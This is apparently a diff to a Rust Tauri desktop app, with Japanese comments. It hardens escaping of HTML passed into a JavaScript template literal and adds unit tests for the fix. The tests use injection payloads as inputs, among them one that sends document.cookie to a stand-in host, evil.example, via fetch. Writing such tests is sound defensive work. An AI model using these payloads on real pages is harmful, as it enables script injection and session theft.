@@ -527,6 +527,17 @@ pub fn open_help_window(app: tauri::AppHandle) -> Result<(), String> {
     Ok(())
 }
 
+/// JS テンプレートリテラル (`` `...` ``) に安全に埋め込めるよう文字列をエスケープする。
+///
+/// `\` を最初にエスケープしてから `` ` `` と `$` をエスケープすることで、
+/// バックスラッシュエスケープより後段の置換で挿入される `\` (`` \` `` / `\$`) が
+/// 二重エスケープされてしまう事故を避けている。
+fn escape_for_js_template_literal(s: &str) -> String {
+    s.replace('\\', "\\\\")
+        .replace('`', "\\`")
+        .replace('$', "\\$")
+}
+
 #[tauri::command]
 pub fn open_keyboard_window(app: tauri::AppHandle) -> Result<(), String> {
     use tauri::Manager;
@@ -592,7 +603,7 @@ document.addEventListener("keydown", e => {{
             .build()
         {
             // HTML を直接評価して表示
-            let escaped = html.replace('\\', "\\\\").replace('`', "\\`");
+            let escaped = escape_for_js_template_literal(&html);
             let _ = win.eval(&format!("document.open();document.write(`{escaped}`);document.close();"));
         }
     });
@@ -620,4 +631,70 @@ pub fn validate_timestamp_format(
         format!("{}{}{}{}", ts, delimiter, stem, ext)
     };
     Ok(preview)
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    /// JS テンプレートリテラルの字句解析を簡易的に模倣し、エスケープされていない
+    /// バッククォート (リテラル終端) や `${` (式展開の開始) が含まれていないかを判定する。
+    /// `\` から始まる 2 文字は正当なエスケープシーケンスとして読み飛ばす。
+    fn has_unescaped_terminator_or_expr(escaped: &str) -> bool {
+        let chars: Vec<char> = escaped.chars().collect();
+        let mut i = 0;
+        while i < chars.len() {
+            match chars[i] {
+                '\\' => i += 2, // エスケープシーケンス（次の 1 文字ごと消費）
+                '`' => return true,
+                '$' if chars.get(i + 1) == Some(&'{') => return true,
+                _ => i += 1,
+            }
+        }
+        false
+    }
+
+    #[test]
+    fn escape_for_js_template_literal_dollar_brace_injection() {
+        // ${alert(1)} のような JS 注入ペイロードが式展開として解釈されないこと
+        let input = "${alert(1)}";
+        let escaped = escape_for_js_template_literal(input);
+        assert_eq!(escaped, "\\${alert(1)}");
+        assert!(!has_unescaped_terminator_or_expr(&escaped));
+    }
+
+    #[test]
+    fn escape_for_js_template_literal_backtick_injection() {
+        // バッククォートによるテンプレートリテラルの早期終端を防ぐ
+        let input = "`;alert(1);`";
+        let escaped = escape_for_js_template_literal(input);
+        assert_eq!(escaped, "\\`;alert(1);\\`");
+        assert!(!has_unescaped_terminator_or_expr(&escaped));
+    }
+
+    #[test]
+    fn escape_for_js_template_literal_backslash_first_order() {
+        // バックスラッシュを最初にエスケープしないと、後段の `\`` / `\$` が
+        // 二重エスケープされて壊れてしまう。入力に `\$` を含めて順序を検証する。
+        let input = "\\$";
+        let escaped = escape_for_js_template_literal(input);
+        // 期待: `\` -> `\\`、`$` -> `\$` の順で適用され `\\\$` になる
+        assert_eq!(escaped, "\\\\\\$");
+        assert!(!has_unescaped_terminator_or_expr(&escaped));
+    }
+
+    #[test]
+    fn escape_for_js_template_literal_combined_payload() {
+        // 実際の攻撃ベクタに近い、SVG の title 等に混入しうる複合ペイロード
+        let input = "</title>${fetch('https://evil.example/'+document.cookie)}<title>";
+        let escaped = escape_for_js_template_literal(input);
+        assert!(!has_unescaped_terminator_or_expr(&escaped));
+    }
+
+    #[test]
+    fn escape_for_js_template_literal_plain_text_unchanged() {
+        let input = "普通の設定名 (no special chars)";
+        assert_eq!(escape_for_js_template_literal(input), input);
+        assert!(!has_unescaped_terminator_or_expr(input));
+    }
 }
